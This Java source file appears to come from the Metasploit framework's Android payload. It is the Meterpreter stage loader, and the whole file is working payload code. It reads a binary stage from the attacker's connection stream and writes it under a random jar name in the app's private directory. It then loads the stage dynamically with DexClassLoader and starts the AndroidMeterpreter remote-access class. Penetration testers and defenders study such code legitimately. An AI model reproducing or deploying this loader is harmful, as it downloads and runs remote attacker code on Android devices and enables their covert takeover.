
package androidpayload.stage;

import dalvik.system.DexClassLoader;

import android.content.Context;

import java.io.DataInputStream;
import java.io.File;
import java.io.FileOutputStream;
import java.io.OutputStream;
import java.util.Random;

/**
 * Meterpreter Java Payload Proxy
 */
public class Meterpreter implements Stage {

    private String randomJarName() {
        char[] chars = "abcdefghijklmnopqrstuvwxyz".toCharArray();
        StringBuilder sb = new StringBuilder();
        Random random = new Random();
        for (int i = 0; i < 20; i++) {
            char c = chars[random.nextInt(chars.length)];
            sb.append(c);
        }
        return sb.toString() + ".jar";
    }

    public void start(DataInputStream in, OutputStream out, Context context, String[] parameters) throws Exception {
        String jarFile = randomJarName();
        String path = context.getFilesDir().getAbsolutePath();

        // Read the stage
        int coreLen = in.readInt();
        byte[] core = new byte[coreLen];
        in.readFully(core);

        // Write the stage to /data/data/.../files/
        FileOutputStream fos = context.openFileOutput(jarFile, Context.MODE_PRIVATE);
        fos.write(core);
        fos.close();

        // Load the stage
        DexClassLoader classLoader = new DexClassLoader(path + File.separatorChar + jarFile, path, path, context.getClassLoader());
        Class<?> myClass = classLoader.loadClass("com.metasploit.meterpreter.AndroidMeterpreter");
        myClass.getConstructor(new Class[] {
                DataInputStream.class, OutputStream.class, Context.class, boolean.class
        }).newInstance(in, out, context, false);
    }
}
